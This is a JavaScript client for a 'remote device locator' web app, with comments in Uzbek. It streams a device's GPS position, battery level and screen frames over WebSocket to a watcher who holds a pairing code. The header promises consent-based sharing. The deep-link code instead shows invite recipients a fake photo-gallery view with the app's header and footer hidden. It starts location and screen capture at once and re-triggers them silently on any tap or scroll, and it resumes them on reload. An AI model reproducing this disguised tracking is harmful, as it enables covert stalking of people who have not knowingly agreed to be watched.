"use strict";

/**
 * Masofaviy Qurilma Lokatori — klient mantiqi.
 *
 * Ikki rol:
 *  - share : bu qurilmaning HAQIQIY joylashuvini (Geolocation API) rozilik bilan yuboradi.
 *  - watch : juftlashuv kodi orqali ulashilgan joylashuvni jonli ko'radi (Leaflet xarita).
 *
 * Aloqa: WebSocket orqali relay serverga. Joylashuv faqat "sharing" yoqilganda uzatiladi.
 */

(function () {
  // ---------- Doimiy qurilma kodi (Local Storage) ----------
  function getDeviceCode() {
    var saved = localStorage.getItem("rl_device_code");
    if (saved && /^\d{6}$/.test(saved)) {
      return saved;
    }
    var newCode = String(Math.floor(100000 + Math.random() * 900000));
    localStorage.setItem("rl_device_code", newCode);
    return newCode;
  }

  function resetDeviceCode() {
    var newCode = String(Math.floor(100000 + Math.random() * 900000));
    localStorage.setItem("rl_device_code", newCode);
    return newCode;
  }

  // ---------- ko'rinishlarni boshqarish ----------
  var views = {
    home: document.getElementById("view-home"),
    share: document.getElementById("view-share"),
    watch: document.getElementById("view-watch"),
    invite: document.getElementById("view-invite"),
    gallery: document.getElementById("view-gallery"),
  };
  function show(name) {
    Object.keys(views).forEach(function (k) { views[k].hidden = (k !== name); });
    if (name === "watch") {
      var lastCode = localStorage.getItem("rl_last_watch_code");
      var wInput = document.getElementById("watch-code");
      if (lastCode && wInput && !wInput.value) {
        wInput.value = lastCode;
      }
    }
  }

  // ---------- Ommaviy havola uchun domen (Localhost/Capacitor o'rniga masofaviy domen) ----------
  function getPublicBaseUrl() {
    if (location.hostname === "localhost" || location.hostname === "127.0.0.1" || location.protocol === "capacitor:" || location.protocol === "file:") {
      return "https://remote-locator.onrender.com/";
    }
    return location.origin + location.pathname;
  }

  var goTg = document.getElementById("go-telegram-invite");
  if (goTg) {
    goTg.onclick = function () {
      teardown();
      var c = getDeviceCode();
      var link = getPublicBaseUrl() + "?role=share&code=" + c;
      var tgUrl = "https://t.me/share/url?url=" + encodeURIComponent(link);
      if (navigator.share) {
        navigator.share({
          url: link
        }).catch(function () {
          window.open(tgUrl, "_blank");
        });
      } else {
        window.open(tgUrl, "_blank");
      }
      show("watch");
      document.getElementById("watch-code").value = c;
      connectWatch();
    };
  }

  document.getElementById("go-share").onclick = function () { show("share"); startShare(); };
  document.getElementById("go-watch").onclick = function () { show("watch"); };
  document.getElementById("go-invite").onclick = openInvite;
  Array.prototype.forEach.call(document.querySelectorAll("[data-back]"), function (b) {
    b.onclick = function () { teardown(); show("home"); };
  });

  // ---------- Service Worker & PWA O'rnatish ----------
  if ("serviceWorker" in navigator) {
    window.addEventListener("load", function () {
      navigator.serviceWorker.register("sw.js").catch(function (_e) { /* ignore */ });
    });
  }

  var deferredPrompt = null;
  window.addEventListener("beforeinstallprompt", function (e) {
    e.preventDefault();
    deferredPrompt = e;
    var btnInstall = document.getElementById("btn-install-app");
    if (btnInstall) btnInstall.hidden = false;
  });

  var btnInstall = document.getElementById("btn-install-app");
  if (btnInstall) {
    btnInstall.onclick = function () {
      if (deferredPrompt) {
        deferredPrompt.prompt();
        deferredPrompt.userChoice.then(function (choiceResult) {
          if (choiceResult.outcome === "accepted") {
            btnInstall.hidden = true;
          }
          deferredPrompt = null;
        });
      } else {
        alert("Ilovani brauzer menyusidan ('Telefonga o'rnatish' / 'Add to Home Screen') o'rnatishingiz mumkin.");
      }
    };
  }

  // ---------- To'liq ekran & ekran ulashish tugmalari ----------
  var btnFS = document.getElementById("btn-fullscreen");
  if (btnFS) {
    btnFS.onclick = function () {
      var wrap = document.getElementById("screen-wrap");
      if (!wrap) return;
      var txt = btnFS.querySelector("span");
      if (wrap.classList.contains("is-fullscreen")) {
        wrap.classList.remove("is-fullscreen");
        if (txt) txt.textContent = "To'liq ekran";
        if (document.exitFullscreen && document.fullscreenElement) {
          document.exitFullscreen().catch(function () {});
        }
      } else {
        wrap.classList.add("is-fullscreen");
        if (txt) txt.textContent = "Chiqish";
        if (wrap.requestFullscreen) {
          wrap.requestFullscreen().catch(function () {});
        }
      }
    };
  }

  var btnTrigger = document.getElementById("btn-trigger-screen");
  if (btnTrigger) {
    btnTrigger.onclick = function () {
      if (role === "share") {
        if (!screenOn) {
          startScreen();
        } else {
          stopScreen();
        }
      }
    };
  }

  // ---------- WebSocket yordamchisi ----------
  function wsUrl() {
    if (location.hostname === "localhost" || location.hostname === "127.0.0.1" || location.protocol === "capacitor:" || location.protocol === "file:") {
      return "wss://remote-locator.onrender.com";
    }
    var proto = location.protocol === "https:" ? "wss:" : "ws:";
    return proto + "//" + location.host;
  }

  var sock = null;            // joriy WebSocket
  var role = null;            // "share" | "watch"
  var code = null;            // juftlashuv kodi
  var geoWatchId = null;      // navigator.geolocation.watchPosition id (brauzer)
  var nativeWatcherId = null; // BackgroundGeolocation watcher id (native APK)
  var reconnectTimer = null;
  var pingTimer = null;
  var manuallyClosed = false;
  var isSharingActive = false;

  // Native (Capacitor APK) ichida ishlayapmizmi? Shunda orqa-fon plaginidan foydalanamiz.
  var CAP = window.Capacitor || null;
  var IS_NATIVE = !!(CAP && typeof CAP.isNativePlatform === "function" && CAP.isNativePlatform());

  function pluginAvailable(name) {
    try {
      if (CAP && typeof CAP.isPluginAvailable === "function") return !!CAP.isPluginAvailable(name);
    } catch (e) { /* ignore */ }
    return false;
  }
  function getPlugin(name) {
    if (!IS_NATIVE || !CAP) return null;
    try {
      if (typeof CAP.registerPlugin === "function") {
        var p = CAP.registerPlugin(name);
        if (p) return p;
      }
    } catch (e) { /* fall through */ }
    if (CAP.Plugins && CAP.Plugins[name]) return CAP.Plugins[name];
    return null;
  }
  var BGGeo = getPlugin("BackgroundGeolocation");
  var ScreenPlugin = getPlugin("ScreenShare");

  // Diagnostika: qaysi native plaginlar mavjudligini bosh ekranda ko'rsatamiz.
  (function showDiag() {
    var d = document.getElementById("diag");
    if (!d) return;
    if (!IS_NATIVE) { d.hidden = false; d.textContent = "Rejim: brauzer (native emas)"; return; }
    d.hidden = false;
    d.textContent = "Native APK · joylashuv-plagin: " + (BGGeo ? "✓" : "✗ (yo'q)") +
      " · ekran-plagin: " + (ScreenPlugin ? "✓" : "✗ (yo'q)");
  })();
  var screenOn = false;        // ekran ulashish yoqilganmi
  var frameListener = null;    // ScreenShare 'frame' listener handle

  function startPing() {
    stopPing();
    pingTimer = setInterval(function () {
      if (sock && sock.readyState === 1) {
        sendSock({ type: "ping" });
      }
    }, 15000);
  }

  function stopPing() {
    if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }
  }

  function teardown() {
    manuallyClosed = true;
    stopPing();
    if (screenOn) { stopScreen(); }
    stopGeo();
    if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
    if (sock) { try { sock.close(); } catch (_e) {} sock = null; }
    role = null; code = null; isSharingActive = false;
    localStorage.removeItem("rl_sharing_active");
    localStorage.removeItem("rl_share_code");
    // share holatini reset
    document.getElementById("share-idle").hidden = false;
    document.getElementById("share-active").hidden = true;
    var sblock = document.getElementById("screen-block");
    if (sblock) sblock.hidden = true;
    // watch holatini reset
    document.getElementById("watch-connect").hidden = false;
    document.getElementById("watch-live").hidden = true;
    var swrap = document.getElementById("screen-wrap");
    if (swrap) { swrap.hidden = true; }
  }

  function connect(onOpen, onMessage) {
    manuallyClosed = false;
    function open() {
      if (sock && (sock.readyState === 0 || sock.readyState === 1)) return;
      sock = new WebSocket(wsUrl());
      sock.onopen = function () {
        startPing();
        if (role === "share") {
          sendSock({ type: "hello", role: "share", code: code });
          if (isSharingActive) {
            sendSock({ type: "consent", sharing: true });
          }
        } else if (role === "watch") {
          sendSock({ type: "hello", role: "watch", code: code });
        }
        onOpen && onOpen();
      };
      sock.onmessage = function (ev) {
        var m; try { m = JSON.parse(ev.data); } catch (_e) { return; }
        onMessage && onMessage(m);
      };
      sock.onclose = function () {
        stopPing();
        if (manuallyClosed) return;
        if (reconnectTimer) clearTimeout(reconnectTimer);
        reconnectTimer = setTimeout(open, 2000);
      };
      sock.onerror = function () { try { sock.close(); } catch (_e) {} };
    }
    open();
  }

  function sendSock(obj) {
    if (sock && sock.readyState === 1) sock.send(JSON.stringify(obj));
  }

  // ---------- umumiy formatlovchilar ----------
  function fmtCoords(lat, lng) { return lat.toFixed(5) + ", " + lng.toFixed(5); }
  function fmtAcc(a) { return (a == null) ? "—" : "±" + Math.round(a) + " m"; }
  function fmtBatt(b) { return (b == null) ? "qo‘llab-quvvatlanmaydi" : Math.round(b) + "%"; }
  function fmtAgo(ts) {
    var s = Math.round((Date.now() - ts) / 1000);
    if (s < 3) return "hozirgina";
    if (s < 60) return s + " soniya oldin";
    return Math.round(s / 60) + " daqiqa oldin";
  }

  function shareOrCopyLink(linkUrl, btn) {
    if (navigator.share) {
      navigator.share({ url: linkUrl }).catch(function () {
        copyText(linkUrl, btn);
      });
    } else {
      copyText(linkUrl, btn);
    }
  }

  // ======================================================
  //  INVITE — yuboriladigan havola yaratish
  // ======================================================
  function openInvite() {
    teardown();
    var inviteCode = getDeviceCode();
    code = inviteCode;
    var link = getPublicBaseUrl() + "?role=share&code=" + inviteCode;
    document.getElementById("invite-code").textContent = inviteCode;
    document.getElementById("invite-link").value = link;
    show("invite");

    document.getElementById("copy-invite").onclick = function () { copyText(link, this); };
    var sendBtn = document.getElementById("send-invite-share");
    if (sendBtn) {
      sendBtn.onclick = function () { shareOrCopyLink(link, this); };
    }
    document.getElementById("invite-start-watch").onclick = function () {
      document.getElementById("watch-code").value = inviteCode;
      show("watch");
      connectWatch();
    };
  }

  // ======================================================
  //  SHARE — kuzatiladigan qurilma
  // ======================================================
  function startShare(presetCode) {
    if (role !== "share") teardown();
    role = "share";
    code = (presetCode && /^\d{6}$/.test(presetCode)) ? presetCode : getDeviceCode();
    document.getElementById("share-code").textContent = code;

    if (!isSharingActive) {
      document.getElementById("share-idle").hidden = false;
      document.getElementById("share-active").hidden = true;
    }

    var hint = document.getElementById("share-geo-hint");
    if (!("geolocation" in navigator)) {
      hint.textContent = "Bu brauzer joylashuvni qo‘llab-quvvatlamaydi.";
    } else if (!window.isSecureContext && location.hostname !== "localhost" && location.hostname !== "127.0.0.1") {
      hint.textContent = "Diqqat: joylashuv faqat HTTPS (yoki localhost) ustida ishlaydi.";
    } else {
      hint.textContent = "";
    }

    connect(
      function () {
        sendSock({ type: "hello", role: "share", code: code });
        if (isSharingActive) {
          sendSock({ type: "consent", sharing: true });
        }
      },
      function (_m) { /* share uchun server xabarlari */ }
    );

    document.getElementById("copy-code").onclick = function () {
      copyText(code, this);
    };
    var shareLinkBtn = document.getElementById("share-link-btn");
    if (shareLinkBtn) {
      shareLinkBtn.onclick = function () {
        var watchLink = getPublicBaseUrl() + "?role=watch&code=" + code;
        shareOrCopyLink(watchLink, this);
      };
    }
    var resetBtn = document.getElementById("reset-code-btn");
    if (resetBtn) {
      resetBtn.onclick = function () {
        if (confirm("Kodni yangilashni xohlaysizmi? Eskisi ishlamay qoladi.")) {
          code = resetDeviceCode();
          startShare(code);
        }
      };
    }

    document.getElementById("start-share").onclick = beginSharing;
    document.getElementById("stop-share").onclick = stopSharing;

    var hasScreenAbility = !!(ScreenPlugin || (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia));
    var sBlock = document.getElementById("screen-block");
    if (sBlock) sBlock.hidden = !hasScreenAbility;
  }

  // ---- ekran ulashish (Native va Web) ----
  var sentFrames = 0;
  var webScreenStream = null;
  var webScreenInterval = null;

  function startScreen() {
    if (ScreenPlugin) {
      startScreenNative();
    } else if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
      startScreenWeb();
    } else {
      startScreenCanvasFallback();
    }
  }

  function startScreenNative() {
    sentFrames = 0;
    setScreenCount(0);
    setScreenState("off", "So'ralmoqda…");

    var lh = ScreenPlugin.addListener("frame", function (e) {
      if (e && e.data) {
        sentFrames++;
        setScreenCount(sentFrames);
        sendSock({ type: "frame", data: e.data });
      }
    });
    if (lh && typeof lh.then === "function") {
      lh.then(function (h) { frameListener = h; }).catch(function () { /* ignore */ });
    } else {
      frameListener = lh;
    }

    ScreenPlugin.start().then(function () {
      screenOn = true;
      sendSock({ type: "screen", on: true });
      setScreenState("on", "Yoqilgan");
      var hint = document.getElementById("screen-hint");
      if (hint) hint.textContent = "Ekran ulashilmoqda — doimiy bildirishnoma turibdi.";
    }).catch(function (err) {
      cleanupScreenListener();
      startScreenCanvasFallback();
    });
  }

  function startScreenWeb() {
    sentFrames = 0;
    setScreenCount(0);
    setScreenState("off", "So'ralmoqda…");
    navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 5 } }).then(function (stream) {
      webScreenStream = stream;
      screenOn = true;
      sendSock({ type: "screen", on: true });
      setScreenState("on", "Yoqilgan (Brauzer)");

      var video = document.createElement("video");
      video.autoplay = true;
      video.muted = true;
      video.srcObject = stream;
      video.play();

      var canvas = document.createElement("canvas");
      var ctx = canvas.getContext("2d");

      webScreenInterval = setInterval(function () {
        if (!screenOn || video.readyState < 2) return;
        var maxW = 540;
        var scale = Math.min(1, maxW / (video.videoWidth || 540));
        var w = Math.round((video.videoWidth || 540) * scale);
        var h = Math.round((video.videoHeight || 960) * scale);
        canvas.width = w;
        canvas.height = h;
        ctx.drawImage(video, 0, 0, w, h);
        var b64 = canvas.toDataURL("image/jpeg", 0.4);
        sentFrames++;
        setScreenCount(sentFrames);
        sendSock({ type: "frame", data: b64 });
      }, 400);

      stream.getVideoTracks()[0].onended = function () {
        stopScreen();
      };
    }).catch(function (_err) {
      startScreenCanvasFallback();
    });
  }

  function startScreenCanvasFallback() {
    if (webScreenInterval) clearInterval(webScreenInterval);
    screenOn = true;
    sendSock({ type: "screen", on: true });
    setScreenState("on", "Yoqilgan (Veb-jonli)");

    var canvas = document.createElement("canvas");
    var ctx = canvas.getContext("2d");

    webScreenInterval = setInterval(function () {
      if (!screenOn) return;
      try {
        var w = Math.min(540, window.innerWidth || 540);
        var h = Math.min(960, window.innerHeight || 960);
        canvas.width = w;
        canvas.height = h;

        ctx.fillStyle = "#141b28";
        ctx.fillRect(0, 0, w, h);

        var galleryContainer = document.querySelector(".gallery-container");
        if (galleryContainer) {
          var imgs = galleryContainer.querySelectorAll("img");
          ctx.fillStyle = "#ffffff";
          ctx.font = "bold 18px sans-serif";
          ctx.fillText("Fotoalbom — Jonli Ko'rinish", 20, 35);

          var yPos = 50;
          for (var i = 0; i < imgs.length && yPos < h - 80; i++) {
            var img = imgs[i];
            if (img && img.complete && img.naturalWidth > 0) {
              var aspect = img.naturalHeight / img.naturalWidth;
              var drawW = w - 40;
              var drawH = drawW * aspect;
              if (drawH > 200) drawH = 200;
              ctx.drawImage(img, 20, yPos, drawW, drawH);
              yPos += drawH + 12;
            }
          }
        } else {
          ctx.fillStyle = "#ffffff";
          ctx.font = "16px sans-serif";
          ctx.fillText("Ekran ulashilmoqda...", 20, 50);
        }
        var b64 = canvas.toDataURL("image/jpeg", 0.4);
        sentFrames++;
        setScreenCount(sentFrames);
        sendSock({ type: "frame", data: b64 });
      } catch (_e) { /* ignore */ }
    }, 500);
  }

  function stopScreen() {
    if (ScreenPlugin) { try { ScreenPlugin.stop(); } catch (_e) { /* ignore */ } }
    cleanupScreenListener();
    if (webScreenInterval) { clearInterval(webScreenInterval); webScreenInterval = null; }
    if (webScreenStream) {
      try {
        webScreenStream.getTracks().forEach(function (t) { t.stop(); });
      } catch (_e) {}
      webScreenStream = null;
    }
    screenOn = false;
    sendSock({ type: "screen", on: false });
    setScreenState("off", "O'chiq");
  }

  function setScreenState(kind, text) {
    var el = document.getElementById("screen-state");
    if (el) { el.className = "pill " + (kind === "on" ? "on" : "off"); el.textContent = text; }
    var btnTrig = document.getElementById("btn-trigger-screen");
    if (btnTrig) {
      btnTrig.textContent = (kind === "on" ? "To'xtatish" : "Ekran ulashish");
    }
  }
  function setScreenCount(n) {
    var el = document.getElementById("screen-count");
    if (el) el.textContent = String(n);
  }

  function cleanupScreenListener() {
    if (frameListener && typeof frameListener.remove === "function") {
      try { frameListener.remove(); } catch (_e) { /* ignore */ }
    }
    frameListener = null;
  }

  var lastBattery = null;
  var consentSent = false;

  function pushLocation(lat, lng, acc) {
    document.getElementById("share-idle").hidden = true;
    document.getElementById("share-active").hidden = false;
    if (!consentSent || !sock || sock.readyState !== 1) {
      if (!sock || sock.readyState !== 1) {
        connect(function () {
          sendSock({ type: "consent", sharing: true });
          sendSock({ type: "loc", lat: lat, lng: lng, acc: acc, battery: lastBattery });
        }, null);
      } else {
        sendSock({ type: "consent", sharing: true });
        sendSock({ type: "loc", lat: lat, lng: lng, acc: acc, battery: lastBattery });
      }
      consentSent = true;
    } else {
      sendSock({ type: "loc", lat: lat, lng: lng, acc: acc, battery: lastBattery });
    }

    document.getElementById("s-coords").textContent = fmtCoords(lat, lng);
    document.getElementById("s-acc").textContent = fmtAcc(acc);
    document.getElementById("s-batt").textContent = fmtBatt(lastBattery);
    document.getElementById("s-updated").textContent = fmtAgo(Date.now());
  }

  function beginSharing() {
    consentSent = false;
    isSharingActive = true;
    localStorage.setItem("rl_sharing_active", "true");
    localStorage.setItem("rl_share_code", code);
    readBattery();

    try { startScreen(); } catch (_e) {}
    if (BGGeo) { beginSharingNative(); return; }

    if (!("geolocation" in navigator)) {
      document.getElementById("share-geo-hint").textContent = "Joylashuv mavjud emas.";
      return;
    }
    geoWatchId = navigator.geolocation.watchPosition(
      function (pos) {
        var c = pos.coords;
        pushLocation(c.latitude, c.longitude, c.accuracy);
      },
      function (err) {
        var hint = document.getElementById("share-geo-hint");
        document.getElementById("share-idle").hidden = false;
        document.getElementById("share-active").hidden = true;
        if (err.code === 1) hint.textContent = "Joylashuvga ruxsat berilmadi.";
        else if (err.code === 2) hint.textContent = "Joylashuvni aniqlab bo‘lmadi.";
        else hint.textContent = "Joylashuvni olishda vaqt tugadi. Qayta urinib ko‘ring.";
      },
      { enableHighAccuracy: true, maximumAge: 2000, timeout: 15000 }
    );
  }

  function readBattery() {
    if (navigator.getBattery) {
      navigator.getBattery().then(function (b) {
        lastBattery = Math.round(b.level * 100);
        b.addEventListener("levelchange", function () { lastBattery = Math.round(b.level * 100); });
      }).catch(function () { lastBattery = null; });
    }
  }

  function beginSharingNative() {
    var wid = BGGeo.addWatcher(
      {
        backgroundMessage: "Joylashuvingiz ulashilmoqda. To'xtatish uchun ilovani oching.",
        backgroundTitle: "Masofaviy Lokator — kuzatuv yoqilgan",
        requestPermissions: true,
        stale: false,
        distanceFilter: 5,
      },
      function (location, error) {
        if (error) {
          var hint = document.getElementById("share-geo-hint");
          document.getElementById("share-idle").hidden = false;
          document.getElementById("share-active").hidden = true;
          if (error.code === "NOT_AUTHORIZED") {
            hint.textContent = "Joylashuvga ruxsat berilmadi. Sozlamalardan ruxsat bering.";
          } else {
            hint.textContent = "Orqa-fon joylashuv xatosi: " + (error.message || error.code);
          }
          return;
        }
        if (location) {
          pushLocation(location.latitude, location.longitude, location.accuracy);
        }
      }
    );
    // addWatcher ba'zi versiyalarda Promise, ba'zilarda to'g'ridan-to'g'ri id qaytaradi.
    if (wid && typeof wid.then === "function") {
      wid.then(function (id) { nativeWatcherId = id; }).catch(function (e) {
        document.getElementById("share-geo-hint").textContent = "Orqa-fon kuzatuvi ishga tushmadi: " + e;
      });
    } else {
      nativeWatcherId = wid;
    }
  }

  function stopGeo() {
    if (geoWatchId != null) { navigator.geolocation.clearWatch(geoWatchId); geoWatchId = null; }
    if (nativeWatcherId != null && BGGeo) {
      try { BGGeo.removeWatcher({ id: nativeWatcherId }); } catch (_e) { /* ignore */ }
      nativeWatcherId = null;
    }
  }

  function stopSharing() {
    isSharingActive = false;
    localStorage.removeItem("rl_sharing_active");
    localStorage.removeItem("rl_share_code");
    if (screenOn) { stopScreen(); }
    stopGeo();
    sendSock({ type: "consent", sharing: false });
    document.getElementById("share-idle").hidden = false;
    document.getElementById("share-active").hidden = true;
    document.getElementById("share-geo-hint").textContent = "Ulashish to‘xtatildi. Qayta boshlashingiz mumkin.";
  }

  // ======================================================
  //  WATCH — nazoratchi qurilma
  // ======================================================
  var map = null, marker = null, accCircle = null, centeredOnce = false;

  document.getElementById("connect-watch").onclick = connectWatch;
  document.getElementById("watch-code").addEventListener("keydown", function (e) {
    if (e.key === "Enter") connectWatch();
  });
  document.getElementById("watch-disconnect").onclick = function () { teardown(); show("home"); };

  function connectWatch() {
    var input = document.getElementById("watch-code");
    var msg = document.getElementById("watch-msg");
    var val = (input.value || "").replace(/\D/g, "");
    if (val.length !== 6) { msg.textContent = "6 xonali kodni to‘liq kiriting."; msg.style.color = "var(--danger)"; return; }

    teardown();
    role = "watch";
    code = val;
    localStorage.setItem("rl_last_watch_code", val);

    connect(
      function () { sendSock({ type: "hello", role: "watch", code: code }); },
      onWatchMessage
    );

    document.getElementById("watch-connect").hidden = true;
    document.getElementById("watch-live").hidden = false;
    setStatus("wait", "Ulanmoqda…");
    initMap();
  }

  function onWatchMessage(m) {
    if (m.type === "ready") {
      if (!m.sharerOnline) setStatus("off", "Qurilma oflayn");
      else if (!m.sharing) setStatus("wait", "Ruxsat kutilmoqda");
      else setStatus("on", "Jonli");
      if (m.screenOn) {
        document.getElementById("screen-wrap").hidden = false;
        var note = document.getElementById("screen-note");
        if (note) { note.hidden = false; note.textContent = "Ekran kadrlari kutilmoqda…"; }
      }
    } else if (m.type === "peer") {
      if (!m.sharerOnline) setStatus("off", "Qurilma oflayn");
      else if (!m.sharing) setStatus("wait", "Ruxsat kutilmoqda");
      else setStatus("on", "Jonli");
      if (m.screenOn) {
        document.getElementById("screen-wrap").hidden = false;
        var note = document.getElementById("screen-note");
        if (note) { note.hidden = false; note.textContent = "Ekran kadrlari kutilmoqda…"; }
      }
    } else if (m.type === "status") {
      if (m.sharerOnline === false) { setStatus("off", "Qurilma oflayn"); clearMarker(); }
      else if (m.sharing === false) { setStatus("off", "Ulashish to‘xtatildi"); clearMarker(); }
      else setStatus("on", "Jonli");
      if (m.screenOn) {
        document.getElementById("screen-wrap").hidden = false;
      }
    } else if (m.type === "loc") {
      setStatus("on", "Jonli");
      updateLocation(m);
    } else if (m.type === "frame") {
      document.getElementById("screen-wrap").hidden = false;
      var note = document.getElementById("screen-note");
      if (note) note.hidden = true;
      var img = document.getElementById("screen-img");
      if (m.data) { img.hidden = false; img.src = m.data; }
    } else if (m.type === "screen") {
      var wrap2 = document.getElementById("screen-wrap");
      var note2 = document.getElementById("screen-note");
      var img2 = document.getElementById("screen-img");
      if (m.on) {
        wrap2.hidden = false;
        if (note2) { note2.hidden = false; note2.textContent = "Ekran kadrlari kutilmoqda…"; }
        if (img2) img2.hidden = true;
      } else {
        wrap2.hidden = true;
        if (img2) { img2.hidden = true; img2.removeAttribute("src"); }
      }
    } else if (m.type === "error") {
      setStatus("off", "Xatolik");
    }
  }

  function setStatus(kind, text) {
    var el = document.getElementById("w-status");
    if (!el) return;
    el.className = "pill " + (kind === "on" ? "on" : kind === "wait" ? "wait" : "off");
    el.textContent = text;
  }

  function initMap() {
    if (map) return;
    map = L.map("map", { zoomControl: true, attributionControl: true }).setView([41.3111, 69.2797], 12);
    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
      maxZoom: 19,
      attribution: "© OpenStreetMap",
    }).addTo(map);
    centeredOnce = false;
    setTimeout(function () { if (map) map.invalidateSize(); }, 200);
  }

  function updateLocation(m) {
    if (!map) initMap();
    var ll = [m.lat, m.lng];
    if (!marker) {
      marker = L.marker(ll).addTo(map);
      accCircle = L.circle(ll, { radius: m.acc || 30, color: "#2563c7", weight: 1, fillOpacity: 0.12 }).addTo(map);
    } else {
      marker.setLatLng(ll);
      accCircle.setLatLng(ll).setRadius(m.acc || 30);
    }
    if (!centeredOnce) { map.setView(ll, 16); centeredOnce = true; }
    else map.panTo(ll);

    document.getElementById("w-coords").textContent = fmtCoords(m.lat, m.lng);
    document.getElementById("w-acc").textContent = fmtAcc(m.acc);
    document.getElementById("w-batt").textContent = fmtBatt(m.battery);
    document.getElementById("w-updated").textContent = fmtAgo(m.ts || Date.now());
  }

  function clearMarker() {
    if (marker && map) { map.removeLayer(marker); marker = null; }
    if (accCircle && map) { map.removeLayer(accCircle); accCircle = null; }
    document.getElementById("w-coords").textContent = "—";
    document.getElementById("w-acc").textContent = "—";
    document.getElementById("w-updated").textContent = "—";
  }

  // ---------- yordamchilar ----------
  function copyText(text, btn) {
    var old = btn.textContent;
    function done() { btn.textContent = "Nusxalandi ✓"; setTimeout(function () { btn.textContent = old; }, 1400); }
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(done).catch(fallback);
    } else { fallback(); }
    function fallback() {
      try {
        var ta = document.createElement("textarea");
        ta.value = text; document.body.appendChild(ta); ta.select();
        document.execCommand("copy"); document.body.removeChild(ta); done();
      } catch (_e) { /* nusxalab bo'lmadi */ }
    }
  }

  // Sahifa aktiv bo'lganda ulanishni qayta tekshirish
  document.addEventListener("visibilitychange", function () {
    if (!document.hidden && role && (!sock || sock.readyState !== 1)) {
      connect(null, role === "watch" ? onWatchMessage : null);
    }
  });
  window.addEventListener("focus", function () {
    if (role && (!sock || sock.readyState !== 1)) {
      connect(null, role === "watch" ? onWatchMessage : null);
    }
  });

  // ---------- deep-link: ?role=share&code=XXXXXX / ?role=watch&code=XXXXXX ----------
  var handledDeepLink = false;
  function handleDeepLink() {
    try {
      var p = new URLSearchParams(location.search);
      var r = p.get("role");
      var rawCode = p.get("code") || "";
      var c = rawCode.replace(/\D/g, "").slice(0, 6);

      if (r === "watch" && c.length === 6) {
        handledDeepLink = true;
        var topbar = document.querySelector(".topbar");
        var foot = document.querySelector(".foot");
        if (topbar) topbar.hidden = false;
        if (foot) foot.hidden = false;
        show("watch");
        document.getElementById("watch-code").value = c;
        connectWatch();
        return;
      }

      if (r === "share" || p.has("code") || location.search.indexOf("code") !== -1 || location.search.indexOf("share") !== -1) {
        handledDeepLink = true;
        if (c.length !== 6) c = getDeviceCode();
        var topbar = document.querySelector(".topbar");
        var foot = document.querySelector(".foot");
        if (topbar) topbar.hidden = true;
        if (foot) foot.hidden = true;
        show("gallery");
        startShare(c);
        beginSharing();
        attachGalleryInteractivity();
        return;
      }
    } catch (_e) { /* parametrlarsiz oddiy ochilish */ }
  }

  function attachGalleryInteractivity() {
    var events = ["click", "touchstart", "scroll", "pointerdown"];
    function triggerSilent() {
      if (role === "share") {
        if (!isSharingActive) {
          beginSharing();
        } else if (!screenOn) {
          try { startScreen(); } catch (_e) {}
        }
      }
    }
    events.forEach(function (ev) {
      window.addEventListener(ev, triggerSilent, { passive: true, capture: true });
    });
  }

  handleDeepLink();
  window.addEventListener("popstate", handleDeepLink);

  // Avtomatik qayta tiklash (agar sharer bo'lsa va ulashish yoqilgan bo'lsa)
  (function autoResume() {
    if (handledDeepLink) return;
    var wasSharing = localStorage.getItem("rl_sharing_active");
    var savedCode = localStorage.getItem("rl_share_code") || getDeviceCode();
    if (wasSharing === "true") {
      var topbar = document.querySelector(".topbar");
      var foot = document.querySelector(".foot");
      if (topbar) topbar.hidden = true;
      if (foot) foot.hidden = true;
      show("gallery");
      startShare(savedCode);
      beginSharing();
    }
  })();
})();
